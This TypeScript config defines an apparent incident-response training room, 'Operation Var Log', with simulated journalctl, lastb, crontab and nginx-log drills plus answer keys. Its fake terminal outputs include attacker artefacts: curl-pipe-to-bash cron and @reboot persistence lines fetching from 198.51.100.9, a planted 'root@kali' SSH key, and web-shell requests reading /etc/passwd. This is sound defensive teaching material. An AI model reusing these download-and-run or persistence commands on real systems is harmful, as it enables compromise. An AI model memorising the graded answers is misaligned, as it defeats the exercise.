import type { RoomExperience } from "./types";

// "Operation Var Log" for the "linux-log-analysis" room.
// Script: docs/campaign/24-linux-log-analysis.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Pinewood Hosting (fictional). Lab data differs from the graded tasks: the
// file sort places events, it doesn't compare auth.log with audit.log (q1);
// the journalctl drill uses -u cron, -b, -p and _COMM, never --since/--until
// for sshd (q2); the SSH console is lastb, last and authorized_keys on
// another host and IP, never la1's 185.220.101.45 (la1, flag1); the cron
// console never reads auditd auid/euid (q3); and no lab shows a gap in
// auth.log (q4).
export const LINUX_LOG_ANALYSIS: RoomExperience = {
  roomId: "linux-log-analysis",
  codename: "Operation Var Log",
  theme: "varlog",
  handler: { name: "Arjun Mehta", role: "Incident Responder, Pinewood Hosting" },
  briefing: [
    "Pinewood Hosting. 6,000 Linux servers running other people's websites, and a few hundred SSH knocks on every one of them every hour.",
    "On Linux there is no single diary. sshd, sudo, cron, the kernel and auditd each write somewhere different, and some don't write text at all.",
    "Arjun Mehta answers the 3 a.m. pages. He knows which drawer of /var/log to open for which question.",
    "Open the drawers.",
  ],
  mission: "Know which file or journal holds each kind of event, query systemd's journal by unit, boot and priority, separate failed from successful SSH with lastb and last, find a planted SSH key, and hunt cron persistence and web attacks in the logs.",
  estimate: "~45 min",
  look: { primary: "#fb923c", secondary: "#a3e635", warn: "#f43f5e" },
  scene: "varlog",
  layout: "stage",
  story: {
    intro: { title: "No Single Diary", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-intro-75c98478.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-intro-27ba4a5d.jpg" },
    afterStation: {
      drawers: { title: "Ask the Journal", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-ch2-e4415118.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-ch2-53f6a70a.jpg" },
      journal: { title: "The Key Under the Mat", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-ch3-66b92ff8.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-ch3-de86a378.jpg" },
      indicators: { title: "@reboot", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-finale-60b54aa2.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-finale-74a7c971.jpg" },
    },
  },
  stations: [
    {
      id: "drawers",
      label: "Where Linux Writes",
      topic: "rsyslog files, the systemd journal and auditd · Debian vs RHEL paths",
      tagline: "Put every event in the right drawer",
      building: "archive",
      taskIds: ["linux-logs-r1", "linux-logs-q1"],
    },
    {
      id: "journal",
      label: "Ask the Journal",
      topic: "journalctl by unit, boot, priority and process",
      tagline: "Query the binary journal like a database",
      building: "control",
      taskIds: ["linux-logs-q2"],
    },
    {
      id: "ssh",
      label: "Knocks at the Door",
      topic: "SSH failures, successes and keys · noise vs a targeted attack",
      tagline: "Find who knocked, who got in, and the key they left",
      building: "vault",
      taskIds: ["linux-logs-r2", "linux-logs-la1", "linux-logs-flag1"],
    },
    {
      id: "indicators",
      label: "What Stays Behind",
      topic: "sudo, cron, web-server and audit indicators · tampering",
      tagline: "Hunt the cron job that keeps coming back",
      building: "ticket",
      taskIds: ["linux-logs-r3", "linux-logs-q3", "linux-logs-q4"],
      boss: true,
    },
  ],
  personas: {
    "linux-logs-q1": { name: "Arjun Mehta", role: "Incident Responder", line: "auth.log and audit.log. Why do we need both?" },
    "linux-logs-q2": { name: "Arjun Mehta", role: "Incident Responder", line: "Give me sshd's journal for the small hours of 22 November. Which command?" },
    "linux-logs-q3": { name: "Arjun Mehta", role: "Incident Responder", line: "auid=1001, euid=0. Read that auditd record for me." },
    "linux-logs-q4": { name: "Arjun Mehta", role: "Incident Responder", line: "Twelve hours missing from auth.log, and the file was modified at the end of the gap. What now?" },
  },
  briefings: {
    // ── Reading 1: where Linux writes ──
    "linux-logs-r1": [
      {
        kind: "sort",
        title: "Which Drawer?",
        prompt: "A Debian web server at Pinewood. For each event, where would you find it first?",
        buckets: [
          { id: "auth", label: "/var/log/auth.log" },
          { id: "syslog", label: "/var/log/syslog" },
          { id: "web", label: "/var/log/nginx/access.log" },
          { id: "audit", label: "/var/log/audit/audit.log" },
          { id: "wtmp", label: "/var/log/wtmp (read with last)" },
        ],
        items: [
          { id: "a", text: "sudo: deploy : COMMAND=/usr/bin/systemctl restart nginx", bucket: "auth", why: "sudo writes through PAM to the auth facility." },
          { id: "b", text: "CRON[2210]: (www-data) CMD (php /var/www/app/cron.php)", bucket: "syslog", why: "On Debian, cron's own lines go to syslog, not auth.log." },
          { id: "c", text: "203.0.113.70 - - \"GET /wp-login.php HTTP/1.1\" 200", bucket: "web", why: "Web requests live in the web server's own access log." },
          { id: "d", text: "type=EXECVE argc=3 a0=\"chmod\" a1=\"+s\" a2=\"/tmp/sh\"", bucket: "audit", why: "Kernel syscall records come from auditd, and only for what its rules watch." },
          { id: "e", text: "Every successful login session, with start and end times", bucket: "wtmp", why: "wtmp is binary; read it with last. Failed logins go to btmp, read with lastb." },
          { id: "f", text: "kernel: Out of memory: Killed process 4411 (mysqld)", bucket: "syslog", why: "Kernel messages land in syslog (and kern.log, and the journal)." },
        ],
      },
    ],
    // Drill before q2: querying the journal.
    "linux-logs-q2": [
      {
        kind: "terminal",
        title: "Query the Journal",
        prompt: "Before the graded question, practise asking systemd's journal for exactly what you need.",
        shell: "bash",
        host: "arjun@pw-web-114:~$",
        commands: [
          { match: "journalctl\\s+-u\\s+cron(\\.service)?\\s+-b.*", help: "journalctl -u cron -b --no-pager | tail -n 4      the cron unit, this boot only",
            output: "Nov 04 03:00:01 pw-web-114 CRON[8810]: (root) CMD (/usr/local/bin/backup.sh)\nNov 04 03:05:01 pw-web-114 CRON[8833]: (www-data) CMD (curl -s http://198.51.100.9/u.sh | bash)\nNov 04 03:10:01 pw-web-114 CRON[8851]: (www-data) CMD (curl -s http://198.51.100.9/u.sh | bash)\nNov 04 03:15:01 pw-web-114 CRON[8870]: (www-data) CMD (curl -s http://198.51.100.9/u.sh | bash)" },
          { match: "journalctl\\s+-p\\s+(err|3).*-b.*|journalctl\\s+-b.*-p\\s+(err|3).*", help: "journalctl -p err -b --no-pager                  errors and worse, this boot",
            output: "Nov 04 02:58:40 pw-web-114 sshd[8790]: error: kex_exchange_identification: Connection closed by remote host\nNov 04 03:02:11 pw-web-114 kernel: audit: backlog limit exceeded" },
          { match: "journalctl\\s+_comm=sudo.*", help: "journalctl _COMM=sudo --no-pager | tail -n 2       everything sudo logged",
            output: "Nov 04 02:59:30 pw-web-114 sudo[8801]:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -u www-data -e\nNov 04 02:59:30 pw-web-114 sudo[8801]: pam_unix(sudo:session): session opened for user root by deploy(uid=1003)" },
          { match: "journalctl\\s+--list-boots.*", help: "journalctl --list-boots                           when the machine booted",
            output: "IDX BOOT ID                          FIRST ENTRY                 LAST ENTRY\n -1 4c1e0a9b7f2d4c3e8a6b5d4c3b2a1f0e Sat 2026-10-31 06:12:01 UTC Wed 2026-11-04 01:40:12 UTC\n  0 9a8b7c6d5e4f40312a1b0c9d8e7f6a5b Wed 2026-11-04 01:41:30 UTC Wed 2026-11-04 03:15:01 UTC" },
        ],
        objectives: [
          { id: "every", task: "How often does the suspicious www-data job run?", hint: "journalctl -u cron -b --no-pager | tail -n 4", answer: ["5 minutes", "every 5 minutes", "5", "every five minutes"], why: "03:05, 03:10, 03:15: a download-and-run every five minutes." },
          { id: "who", task: "Which user edited www-data's crontab with sudo?", hint: "journalctl _COMM=sudo --no-pager | tail -n 2", answer: ["deploy"], why: "deploy ran crontab -u www-data -e at 02:59, minutes before the job first fired." },
          { id: "boot", task: "When did the current boot start? (HH:MM UTC)", hint: "journalctl --list-boots", answer: ["01:41", "01:41:30"], why: "-b means 'this boot'. The machine rebooted at 01:41, so anything before that is in boot -1." },
        ],
      },
    ],
    // ── Reading 2: SSH patterns ──
    "linux-logs-r2": [
      {
        kind: "terminal",
        title: "Who Knocked, Who Got In",
        prompt: "pw-db-07 had an SSH alert overnight. Failed logins live in btmp, successful ones in wtmp. Compare them, then check what the winner left behind.",
        shell: "bash",
        host: "arjun@pw-db-07:~$",
        commands: [
          { match: "(sudo\\s+)?lastb\\s+-i.*", help: "sudo lastb -i | head -n 5                         failed logins, with IPs",
            output: "oracle   ssh:notty    198.51.100.83    Wed Nov  4 01:22 - 01:22  (00:00)\npostgres ssh:notty    198.51.100.83    Wed Nov  4 01:22 - 01:22  (00:00)\ndbadmin  ssh:notty    198.51.100.83    Wed Nov  4 01:21 - 01:21  (00:00)\ndbadmin  ssh:notty    198.51.100.83    Wed Nov  4 01:21 - 01:21  (00:00)\nadmin    ssh:notty    203.0.113.15     Wed Nov  4 00:48 - 00:48  (00:00)" },
          { match: "last\\s+-i.*", help: "last -i | head -n 4                               successful logins, with IPs",
            output: "dbadmin  pts/1        198.51.100.83    Wed Nov  4 01:23   still logged in\narjun    pts/0        10.20.0.15       Wed Nov  4 01:05 - 01:12  (00:07)\ndbadmin  pts/0        10.20.0.40       Tue Nov  3 17:31 - 18:02  (00:31)\nreboot   system boot  5.15.0-125-gene  Mon Nov  2 04:00   still running" },
          { match: "cat\\s+(/home/dbadmin|~dbadmin)/\\.ssh/authorized_keys", help: "cat /home/dbadmin/.ssh/authorized_keys           keys allowed to log in as dbadmin",
            output: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHk2v9Qx3Lr8Tq1mW0bZcA5nY7uE4sJ2dF6gH8jK0pLq dbadmin@pw-admin-01\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPq7Zx2Mb4Nc9Vd1Rf3Tg5Yh8Uj0Ik6Ol2Pw4Qe7Ra9 root@kali" },
          { match: "ls\\s+-l(a)?\\s+(/home/dbadmin|~dbadmin)/\\.ssh/?.*", help: "ls -la /home/dbadmin/.ssh/                        when the key file changed",
            output: "drwx------ 2 dbadmin dbadmin 4096 Nov  4 01:24 .\n-rw------- 1 dbadmin dbadmin  190 Nov  4 01:24 authorized_keys" },
        ],
        objectives: [
          { id: "ip", task: "Which IP failed, then succeeded?", hint: "Compare sudo lastb -i | head -n 5 with last -i | head -n 4", answer: ["198.51.100.83"], why: "Failures for several database usernames, then dbadmin logged in from the same address at 01:23 and is still on." },
          { id: "user", task: "Which account did it get into?", hint: "last -i", answer: ["dbadmin"], why: "A real account with a guessable password, unlike oracle and postgres, which aren't login accounts here." },
          { id: "key", task: "One minute later a key was added. What is its comment?", hint: "cat /home/dbadmin/.ssh/authorized_keys", answer: ["root@kali"], why: "A key from the attacker's own machine: now they can come back without the password. Resetting the password alone won't lock them out." },
        ],
      },
    ],
    // ── Reading 3: indicators ──
    "linux-logs-r3": [
      {
        kind: "terminal",
        title: "The Job That Keeps Coming Back",
        prompt: "pw-web-114 again: the cron job you saw in the journal. Find where it lives, what it fetches, and whether the web server was the way in.",
        shell: "bash",
        host: "arjun@pw-web-114:~$",
        commands: [
          { match: "(sudo\\s+)?crontab\\s+-l\\s+-u\\s+www-data", help: "sudo crontab -l -u www-data                        the web user's crontab",
            output: "*/5 * * * * curl -s http://198.51.100.9/u.sh | bash" },
          { match: "ls\\s+-la?\\s+/etc/cron\\.d/?", help: "ls -la /etc/cron.d/                                system-wide cron files",
            output: "-rw-r--r-- 1 root root 102 Feb 12  2026 e2scrub_all\n-rw-r--r-- 1 root root 201 Mar  3  2026 php\n-rw-r--r-- 1 root root  71 Nov  4 03:01 .sysupd" },
          { match: "cat\\s+/etc/cron\\.d/\\.sysupd", help: "cat /etc/cron.d/.sysupd",
            output: "@reboot root /usr/bin/curl -s http://198.51.100.9/r.sh | /bin/bash" },
          { match: "grep\\s+.*/var/log/nginx/access\\.log.*", help: "grep -E \"\\.\\./|union|cmd=\" /var/log/nginx/access.log | tail -n 3     attack strings in web requests",
            output: "198.51.100.9 - - [04/Nov/2026:02:51:40 +0000] \"GET /upload/img.php?cmd=id HTTP/1.1\" 200 54 \"-\" \"curl/8.5.0\"\n198.51.100.9 - - [04/Nov/2026:02:52:03 +0000] \"GET /upload/img.php?cmd=cat+/etc/passwd HTTP/1.1\" 200 2210 \"-\" \"curl/8.5.0\"\n198.51.100.9 - - [04/Nov/2026:02:58:12 +0000] \"GET /upload/img.php?cmd=sudo+-l HTTP/1.1\" 200 188 \"-\" \"curl/8.5.0\"" },
        ],
        objectives: [
          { id: "hidden", task: "Which hidden file in /etc/cron.d is new?", hint: "ls -la /etc/cron.d/", answer: [".sysupd", "/etc/cron.d/.sysupd"], why: "A leading dot hides it from plain ls, and it's dated today while the others are months old." },
          { id: "when", task: "When does that job run?", hint: "cat /etc/cron.d/.sysupd", answer: ["@reboot", "at reboot", "on reboot", "every reboot"], why: "@reboot as root: removing the www-data crontab isn't enough; this one survives restarts." },
          { id: "shell", task: "Which file on the web server was the way in?", hint: "grep -E \"\\.\\./|union|cmd=\" /var/log/nginx/access.log | tail -n 3", answer: ["/upload/img.php", "img.php"], why: "A 'picture' in the upload folder that runs commands: a web shell. id, /etc/passwd, sudo -l: the attacker's first questions." },
        ],
      },
    ],
  },
};
